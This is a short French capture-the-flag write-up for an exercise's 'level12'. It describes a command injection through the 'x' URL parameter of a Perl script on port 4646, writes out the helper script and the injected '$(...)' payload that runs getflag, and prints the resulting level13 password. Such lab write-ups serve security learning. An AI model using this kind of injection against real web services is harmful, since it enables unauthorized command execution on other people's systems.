# Pré requis

aucun

## GET Flag

A la racine se trouve un fichier level12.pl.
Dans ce fichier se trouve le code execute par flag12 via le port 4646 le parametre "x" est transmissible par les arguments de l'url et sera execute par le systeme via la commande egrep.
Il est donc possible d'injecter du code comme l'execution d'un script prepare avec les droits de flag05.

```
echo 'echo "$(getflag)" > /tmp/res12' > /tmp/EXPLOIT12
```

on peut ensuite lancer le code en se connectant via un navigateur avec l'ip suivi de:`:4646/?x=$(/*/EXPLOIT12)`


le resultat de la commande getflag sera ecrite dans le fichier `/tmp/res12`.

Qui nous donne : `g1qKMiRpXf53AWhDaU7FEkczr`
# Flag

On obtient le flag:
`g1qKMiRpXf53AWhDaU7FEkczr`
On peut se connecter sur le `level13`

```
level13
g1qKMiRpXf53AWhDaU7FEkczr
```
